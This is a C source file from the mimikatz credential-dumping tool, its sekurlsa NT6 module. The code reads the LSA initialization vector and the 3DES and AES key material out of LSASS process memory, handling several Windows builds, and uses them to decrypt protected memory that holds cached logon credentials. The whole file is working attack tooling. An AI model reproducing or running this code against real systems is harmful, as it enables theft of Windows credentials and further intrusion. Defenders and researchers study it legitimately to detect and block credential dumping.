/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_sekurlsa_nt6.h"

NTSTATUS kuhl_m_sekurlsa_nt6_KeyInit = STATUS_NOT_FOUND;
KIWI_BCRYPT_GEN_KEY k3Des, kAes;
BYTE InitializationVector[16];

NTSTATUS kuhl_m_sekurlsa_nt6_init()
{
	if(!NT_SUCCESS(kuhl_m_sekurlsa_nt6_KeyInit))
		kuhl_m_sekurlsa_nt6_KeyInit = kuhl_m_sekurlsa_nt6_LsaInitializeProtectedMemory();
	return kuhl_m_sekurlsa_nt6_KeyInit;
}

NTSTATUS kuhl_m_sekurlsa_nt6_clean()
{
	if(NT_SUCCESS(kuhl_m_sekurlsa_nt6_KeyInit))
		kuhl_m_sekurlsa_nt6_LsaCleanupProtectedMemory();
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_sekurlsa_nt6_LsaInitializeProtectedMemory()
{
	NTSTATUS status = STATUS_NOT_FOUND;
	ULONG dwSizeNeeded;
	__try
	{
		status = BCryptOpenAlgorithmProvider(&k3Des.hProvider, BCRYPT_3DES_ALGORITHM, NULL, 0);
		if(NT_SUCCESS(status))
		{
			status = BCryptSetProperty(k3Des.hProvider, BCRYPT_CHAINING_MODE, (PBYTE) BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
			if(NT_SUCCESS(status))
			{
				status = BCryptGetProperty(k3Des.hProvider, BCRYPT_OBJECT_LENGTH, (PBYTE) &k3Des.cbKey, sizeof(k3Des.cbKey), &dwSizeNeeded, 0);
				if(NT_SUCCESS(status))
					k3Des.pKey = (PBYTE) LocalAlloc(LPTR, k3Des.cbKey);
			}
		}

		if(NT_SUCCESS(status))
		{
			status = BCryptOpenAlgorithmProvider(&kAes.hProvider, BCRYPT_AES_ALGORITHM, NULL, 0);
			if(NT_SUCCESS(status))
			{
				status = BCryptSetProperty(kAes.hProvider, BCRYPT_CHAINING_MODE, (PBYTE) BCRYPT_CHAIN_MODE_CFB, sizeof(BCRYPT_CHAIN_MODE_CFB), 0);
				if(NT_SUCCESS(status))
				{
					status = BCryptGetProperty(kAes.hProvider, BCRYPT_OBJECT_LENGTH, (PBYTE) &kAes.cbKey, sizeof(kAes.cbKey), &dwSizeNeeded, 0);
					if(NT_SUCCESS(status))
						kAes.pKey = (PBYTE) LocalAlloc(LPTR, kAes.cbKey);
				}
			}
		}
	}
	__except(GetExceptionCode() == ERROR_DLL_NOT_FOUND){}
	return status;
}

VOID kuhl_m_sekurlsa_nt6_LsaCleanupProtectedMemory()
{
	__try
	{
		if (k3Des.hProvider)
			BCryptCloseAlgorithmProvider(k3Des.hProvider, 0);
		if (k3Des.hKey)
		{
			BCryptDestroyKey(k3Des.hKey);
			LocalFree(k3Des.pKey);
		}

		if (kAes.hProvider)
			BCryptCloseAlgorithmProvider(kAes.hProvider, 0);
		if (kAes.hKey)
		{
			BCryptDestroyKey(kAes.hKey);
			LocalFree(kAes.pKey);
		}
	}
	__except(GetExceptionCode() == ERROR_DLL_NOT_FOUND){}
	kuhl_m_sekurlsa_nt6_KeyInit = STATUS_NOT_FOUND;
}

VOID WINAPI kuhl_m_sekurlsa_nt6_LsaUnprotectMemory (IN PVOID Buffer, IN ULONG BufferSize)
{
	BCRYPT_KEY_HANDLE *hKey;
	BYTE LocalInitializationVector[16];
	ULONG cbIV, cbResult;
	RtlCopyMemory(LocalInitializationVector, InitializationVector, sizeof(InitializationVector));
	if (BufferSize % 8)
	{
		hKey = &kAes.hKey;
		cbIV = sizeof(InitializationVector);
	}
	else
	{
		hKey = &k3Des.hKey;
		cbIV = sizeof(InitializationVector) / 2;
	}
	__try
	{
		BCryptDecrypt(*hKey, (PUCHAR) Buffer, BufferSize, 0, LocalInitializationVector, cbIV, (PUCHAR) Buffer, BufferSize, &cbResult, 0);
	}
	__except(GetExceptionCode() == ERROR_DLL_NOT_FOUND){}
}

NTSTATUS kuhl_m_sekurlsa_nt6_acquireKeys(ULONG_PTR pInitializationVector, ULONG_PTR phAesKey, ULONG_PTR ph3DesKey)
{
	NTSTATUS status = STATUS_NOT_FOUND;
	if(ReadMemory(pInitializationVector, InitializationVector, sizeof(InitializationVector), NULL))
		if(kuhl_m_sekurlsa_nt6_acquireKey(ph3DesKey, &k3Des) && kuhl_m_sekurlsa_nt6_acquireKey(phAesKey, &kAes))
			status = STATUS_SUCCESS;
	return status;
}

BOOL kuhl_m_sekurlsa_nt6_acquireKey(ULONG_PTR phKey, PKIWI_BCRYPT_GEN_KEY pGenKey)
{
	BOOL status = FALSE;
	KIWI_BCRYPT_HANDLE_KEY hKey; PKIWI_HARD_KEY pHardKey;
	PVOID ptr, buffer, bufferHardKey;
	ULONG taille; LONG offset;

	if(NtBuildNumber < KULL_M_WIN_MIN_BUILD_8)
	{
		taille = sizeof(KIWI_BCRYPT_KEY);
		offset = FIELD_OFFSET(KIWI_BCRYPT_KEY, hardkey);
	}
	else if(NtBuildNumber < KULL_M_WIN_MIN_BUILD_BLUE)
	{
		taille = sizeof(KIWI_BCRYPT_KEY8);
		offset = FIELD_OFFSET(KIWI_BCRYPT_KEY8, hardkey);
	}
	else
	{
		taille = sizeof(KIWI_BCRYPT_KEY81);
		offset = FIELD_OFFSET(KIWI_BCRYPT_KEY81, hardkey);
	}

	if(buffer = LocalAlloc(LPTR, taille))
	{
		if(ReadMemory(phKey, &ptr, sizeof(PVOID), NULL))
		{
			if(ReadMemory((ULONG_PTR) ptr, &hKey, sizeof(KIWI_BCRYPT_HANDLE_KEY), NULL) && hKey.tag == 'UUUR')
			{
				if(ReadMemory((ULONG_PTR) hKey.key, buffer, taille, NULL) &&  ((PKIWI_BCRYPT_KEY) buffer)->tag == 'MSSK') // same as 8
				{
					pHardKey = (PKIWI_HARD_KEY) ((PBYTE) buffer + offset);
					if(bufferHardKey = LocalAlloc(LPTR, pHardKey->cbSecret))
					{
						if(ReadMemory((ULONG_PTR) hKey.key + offset + FIELD_OFFSET(KIWI_HARD_KEY, data), bufferHardKey, pHardKey->cbSecret, NULL))
						{
							__try
							{
								status = NT_SUCCESS(BCryptGenerateSymmetricKey(pGenKey->hProvider, &pGenKey->hKey, pGenKey->pKey, pGenKey->cbKey, (PUCHAR) bufferHardKey, pHardKey->cbSecret, 0));
							}
							__except(GetExceptionCode() == ERROR_DLL_NOT_FOUND){}
						}
						LocalFree(bufferHardKey);
					}
				}
			}
		}
		LocalFree(buffer);
	}
	return status;
}